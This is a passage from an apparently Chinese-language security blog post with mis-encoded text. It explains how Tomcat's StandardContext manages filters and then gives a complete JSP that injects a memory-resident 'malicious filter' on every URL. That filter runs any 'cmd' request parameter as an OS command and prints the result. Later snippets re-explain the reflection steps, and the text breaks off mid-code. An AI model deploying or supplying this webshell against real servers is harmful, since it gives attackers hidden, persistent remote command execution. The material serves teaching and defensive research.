src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929580462-30056289-bc45-487f-812c-711f5bf1841e.png"></p><p>é€šè¿‡ä¸Šé¢çš„æ€è€ƒæˆ‘ä»¬èƒ½å¤Ÿæƒ³åˆ°å¦‚æœæˆ‘ä»¬æƒ³è¦æ’å…¥ä¸€ä¸ªå†…å­˜é©¬çš„å…³é”®ç‚¹å°±åœ¨äºStandardContext.findFilterMaps()å’ŒStandardContext.findFilterConfig()ï¼Œæˆ‘ä»¬å¯ä»¥æ¥çœ‹çœ‹è¿™2ä¸ªæ–¹æ³•çš„å®ç°ï¼Œå¯ä»¥çœ‹åˆ°éƒ½æ˜¯ç›´æ¥ä»StandardContextä¸­å–åˆ°å¯¹åº”çš„å±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦å¾€è¿™2ä¸ªå±æ€§é‡Œé¢æ’å…¥å¯¹åº”çš„filterMapå’ŒfilterConfigå³å¯å®ç°åŠ¨æ€æ·»åŠ filterçš„ç›®çš„:</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929736823-1afa3139-43d7-4ca1-915f-51a858d9a758.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715929765876-047ada2d-7513-4fca-98e0-392259120db5.png"></p><p>å®é™…ä¸ŠStandardContextä¹Ÿæœ‰ä¸€äº›æ–¹æ³•å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ·»åŠ å±æ€§ã€‚é¦–å…ˆæˆ‘ä»¬æ¥çœ‹filtermapsï¼ŒStandardContextç›´æ¥æä¾›äº†å¯¹åº”çš„æ·»åŠ æ–¹æ³•(Beforeæ˜¯å°†filteræ”¾åœ¨é¦–ä½ï¼Œæ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„)ï¼Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932382974-a7004554-d8c8-47f2-96de-82d6e91534f9.png"></p><p>è¿™é‡Œå†å¾€filterMapsæ·»åŠ ä¹‹å‰ä¼šæœ‰ä¸€ä¸ªæ ¡éªŒfiltermapæ˜¯å¦åˆæ³•çš„æ“ä½œï¼Œè·Ÿè¿›validateFilterMap.</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932487587-2eb1b420-300c-41ba-b9fa-1620ece24326.png"></p><p>çº¢è‰²ç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†findFilterDefæ–¹æ³•é—¯å…¥filternameè·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932592404-eacd9c7b-a606-48a0-b606-068f710f604a.png"></p><p>å¯ä»¥çœ‹åˆ°ä¼šæ ¹æ®filtenameå»å¯»æ‰¾å¯¹åº”çš„filterdefå¦‚æœæ²¡æ‰¾åˆ°ä¸ºç©ºçš„è¯ä¼šæŠ¥å¼‚å¸¸é”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬é™¤äº†å¾€filterMapå’ŒfilterConfigæ·»åŠ filterä»¥å¤–è¿˜å‘filterdefä¸­æ·»åŠ filterçš„ç›¸å…³å±æ€§ä¸è¿‡StandardContextç›´æ¥æä¾›äº†å¯¹åº”çš„æ·»åŠ æ–¹æ³•:</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715932861209-3a0794fd-9fc4-4759-ad13-f59bd17d1afa.png"></p><p>æœ€åæˆ‘ä»¬å†æ¥çœ‹filterConfigsï¼Œæ ¹æ®å‘½åè§„åˆ™æœç´¢addFilterConfigï¼Œå‘ç°å¹¶æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘è¦é€šè¿‡åå°„çš„æ–¹æ³•æ‰‹åŠ¨è·å–å±æ€§å¹¶æ·»åŠ :<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1715934494968-409c996f-6aec-468b-9196-3739b46963e3.png"></p><p>:::tips<br>è¿™é‡Œåšä¸€ä¸ªç®€å•çš„æ€»ç»“ï¼š</p><p>1.æ ¹æ®è¯·æ±‚çš„ URL ä» FilterMaps ä¸­æ‰¾å‡ºä¸ä¹‹ URL å¯¹åº”çš„ Filter åç§°</p><p>2.æ ¹æ® Filter åç§°å» FilterConfigs ä¸­å¯»æ‰¾å¯¹åº”åç§°çš„ FilterConfig</p><p>3.æ‰¾åˆ°å¯¹åº”çš„ FilterConfig ä¹‹åæ·»åŠ åˆ° FilterChainä¸­ï¼Œå¹¶ä¸”è¿”å› FilterChain</p><p>4.filterChain ä¸­è°ƒç”¨ internalDoFilter éå†è·å– chain ä¸­çš„ FilterConfig ï¼Œç„¶åä» FilterConfig ä¸­è·å– Filterï¼Œç„¶åè°ƒç”¨ Filter çš„ doFilter æ–¹æ³•</p><p>æ ¹æ®ä¸Šé¢çš„ç®€å•æ€»ç»“ï¼Œä¸éš¾å‘ç°æœ€å¼€å§‹æ˜¯ä» context ä¸­è·å–çš„ FilterMapsï¼Œå°†ç¬¦åˆæ¡ä»¶çš„ä¾æ¬¡æŒ‰ç…§é¡ºåºè¿›è¡Œè°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†è‡ªå·±åˆ›å»ºçš„ä¸€ä¸ª FilterMap ç„¶åå°†å…¶æ”¾åœ¨ FilterMaps çš„æœ€å‰é¢ï¼Œè¿™æ ·å½“ urlpattern åŒ¹é…çš„æ—¶å€™å°±å›å»æ‰¾åˆ°å¯¹åº” FilterName çš„ FilterConfig ï¼Œç„¶åæ·»åŠ åˆ° FilterChain ä¸­ï¼Œæœ€ç»ˆè§¦å‘æˆ‘ä»¬çš„å†…å­˜shell</p><p>:::</p><p>å‚è€ƒï¼š<a href="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p><h4 id="2-1-3å…³äºStandardContextã€ApplicationContextã€ServletContext"><a href="#2-1-3å…³äºStandardContextã€ApplicationContextã€ServletContext" class="headerlink" title="2.1.3å…³äºStandardContextã€ApplicationContextã€ServletContext"></a>2.1.3å…³äºStandardContextã€ApplicationContextã€ServletContext</h4><p>:::tips<br>é€šè¿‡ä¸Šé¢æ€»ç»“åŠåˆ†æå‘ç°æˆ‘ä»¬æƒ³è¦æ³¨å…¥filterå†…å­˜é©¬éœ€è¦è·å–standardcontexå¯¹è±¡æ‰èƒ½è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ã€‚</p><p>è¿™é‡Œç›´æ¥å¤åˆ¶åˆ«çš„å¸ˆå‚…</p><p>å…³äºStandardContextã€ApplicationContextã€ServletContextçš„ç†è§£</p><p>è¯·å‚è€ƒSkayå¸ˆå‚…å’Œyzddmr6å¸ˆå‚…çš„æ–‡ç« ï¼Œä»–ä»¬å†™çš„éå¸¸è¯¦ç»†ï¼Œè¿™é‡Œç›´æ¥è´´å‡ºé“¾æ¥ï¼š</p><p><a href="https://yzddmr6.com/posts/tomcat-context/">https://yzddmr6.com/posts/tomcat-context/</a></p><p><a href="https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew">https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew</a></p><p>å¼•ç”¨Skayå¸ˆå‚…çš„ä¸€å¥è¯æ€»ç»“ï¼š</p><p>ServletContextæ˜¯Servletè§„èŒƒï¼›org.apache.catalina.core.ApplicationContextæ˜¯ServletContextçš„å®ç°ï¼›org.apache.catalina.Contextæ¥å£æ˜¯tomcatå®¹å™¨ç»“æ„ä¸­çš„ä¸€ç§å®¹å™¨ï¼Œä»£è¡¨çš„æ˜¯ä¸€ä¸ªwebåº”ç”¨ç¨‹åºï¼Œæ˜¯tomcatç‹¬æœ‰çš„ï¼Œå…¶æ ‡å‡†å®ç°æ˜¯org.apache.catalina.core.StandardContextï¼Œæ˜¯tomcatå®¹å™¨çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚</p><p>å…³äºStandardContextçš„è·å–æ–¹æ³•ï¼Œé™¤äº†æœ¬æ–‡ä¸­æåˆ°çš„å°†æˆ‘ä»¬çš„ServletContextè½¬ä¸ºStandardContextä»è€Œè·å–contextè¿™ä¸ªæ–¹æ³•ï¼Œè¿˜æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p><p>ä»çº¿ç¨‹ä¸­è·å–StandardContextï¼Œå‚è€ƒLitch1å¸ˆå‚…çš„æ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A">https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A</a></p><p>ä»MBeanä¸­è·å–ï¼Œå‚è€ƒ54simoå¸ˆå‚…çš„æ–‡ç« ï¼š<a href="https://scriptboy.cn/p/tomcat-filter-inject/">https://scriptboy.cn/p/tomcat-filter-inject/</a>ï¼Œä¸è¿‡è¿™ä½å¸ˆå‚…çš„åšå®¢å·²ç»å…³é—­äº†ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å­˜æ¡£ï¼š<a href="https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/">https://web.archive.org/web/20211027223514/https://scriptboy.cn/p/tomcat-filter-inject/</a></p><p>ä»springè¿è¡Œæ—¶çš„ä¸Šä¸‹æ–‡ä¸­è·å–ï¼Œå‚è€ƒ LandGrey@å¥‡å®‰ä¿¡è§‚æ˜Ÿå®éªŒå®¤ å¸ˆå‚…çš„æ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/198886">https://www.anquanke.com/post/id/198886</a></p><p>:::</p><h5 id="2-1-3-1ç¼–å†™demo"><a href="#2-1-3-1ç¼–å†™demo" class="headerlink" title="2.1.3.1ç¼–å†™demo"></a>2.1.3.1ç¼–å†™demo</h5><p>:::tips<br>å¦‚æœæˆ‘ä»¬æƒ³è¦å†™ä¸€ä¸ªFilterå†…å­˜é©¬ï¼Œéœ€è¦ç»è¿‡ä»¥ä¸‹æ­¥éª¤ï¼š</p><p>å‚è€ƒï¼š<a href="https://longlone.top/">https://longlone.top/</a>å®‰å…¨&#x2F;java&#x2F;javaå®‰å…¨&#x2F;å†…å­˜é©¬&#x2F;Tomcat-Filterå‹&#x2F;</p><p>è·å–StandardContextï¼›</p><p>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„filterï¼›</p><p>å®ä¾‹åŒ–ä¸€ä¸ªFilterDefç±»ï¼ŒåŒ…è£…filterå¹¶å­˜æ”¾åˆ°StandardContext.filterDefsä¸­ï¼›</p><p>å®ä¾‹åŒ–ä¸€ä¸ªFilterMapç±»ï¼Œå°†æˆ‘ä»¬çš„Filterå’Œurlpatternç›¸å¯¹åº”ï¼Œä½¿ç”¨addFilterMapBeforeå­˜æ”¾åˆ°StandardContext.filterMapsä¸­ï¼›</p><p>é€šè¿‡åå°„è·å–filterConfigsï¼Œå®ä¾‹åŒ–ä¸€ä¸ªFilterConfigï¼ˆApplicationFilterConfigï¼‰ç±»ï¼Œä¼ å…¥StandardContextä¸filterDefsï¼Œå­˜æ”¾åˆ°filterConfigä¸­ã€‚</p><p>å‚è€ƒï¼š<a href="https://tyaoo.github.io/2021/12/06/Tomcat">https://tyaoo.github.io/2021/12/06/Tomcat</a>å†…å­˜é©¬&#x2F;</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€å®šè¦å…ˆä¿®æ”¹filterDefï¼Œå†ä¿®æ”¹filterMapï¼Œä¸ç„¶ä¼šæŠ›å‡ºæ‰¾ä¸åˆ°filterNameçš„å¼‚å¸¸ã€‚</p><p>:::</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> getRandomString();</span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cmd /c &quot;</span> + cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(filterName);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(filterName, applicationFilterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &quot;</span> + filterName + <span class="string">&quot;&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;tr&gt;&lt;th&gt;Filter Name&lt;/th&gt;&lt;th&gt;URL Patterns&lt;/th&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">        List&lt;String[]&gt; allUrlPatterns = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Object filterConfigObj : filterConfigs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (filterConfigObj <span class="keyword">instanceof</span> ApplicationFilterConfig) &#123;</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) filterConfigObj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">filtername</span> <span class="operator">=</span> filterConfig.getFilterName();</span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterdef</span> <span class="operator">=</span> standardContext.findFilterDef(filtername);</span><br><span class="line">                <span class="keyword">if</span> (filterdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                    FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                    <span class="keyword">for</span> (FilterMap filtermap : filterMaps) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (filtermap.getFilterName().equals(filtername)) &#123;</span><br><span class="line">                            String[] urlPatterns = filtermap.getURLPatterns();</span><br><span class="line">                            allUrlPatterns.add(urlPatterns); <span class="comment">// å°†å½“å‰è¿­ä»£çš„urlPatternsæ·»åŠ åˆ°åˆ—è¡¨ä¸­</span></span><br><span class="line"></span><br><span class="line">                            out.println(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + filtername + <span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                            out.println(<span class="string">&quot;&lt;td&gt;&quot;</span> + String.join(<span class="string">&quot;, &quot;</span>, urlPatterns) + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String[] urlPatterns : allUrlPatterns) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String pattern : urlPatterns) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pattern.equals(<span class="string">&quot;/*&quot;</span>)) &#123;</span><br><span class="line">                    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;shell: http://localhost:8080/test&quot;</span> + pattern + <span class="string">&quot;?cmd=ipconfig&lt;br&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦åˆ†æä¸€ä¸‹contextæ˜¯å¦‚ä½•è·å–çš„ã€‚ç›´æ¥å‚è€ƒW01fh4ckerå¸ˆå‚…çš„åˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br></pre></td></tr></table></figure><p>å…ˆæ˜¯è·å–å½“å‰çš„servletä¸Šä¸‹æ–‡å¹¶æ‹¿åˆ°å…¶ç§æœ‰å­—æ®µcontextï¼Œç„¶åè®¾ç½®å¯è®¿é—®ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡åå°„è¿™ä¸ªcontextå­—æ®µçš„å€¼ï¼Œè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªApplicationContextå¯¹è±¡ï¼›æ¥ç€è·å–ApplicationContextçš„ç§æœ‰å­—æ®µcontextå¹¶è®¾ç½®å¯è®¿é—®ï¼Œç„¶åé€šè¿‡åå°„è·å–ApplicationContextçš„contextå­—æ®µçš„å€¼ï¼Œè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªStandardContextå¯¹è±¡ï¼›æœ€åæ˜¯è·å–StandardContextçš„ç§æœ‰å­—æ®µfilterConfigsï¼Œè®¾ç½®å¯è®¿é—®ä¹‹åé€šè¿‡åå°„è·å–StandardContextçš„filterConfigså­—æ®µçš„å€¼ã€‚</p><p>ç„¶åæ˜¯è¿™æ®µä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(filterName);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(filterName);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> 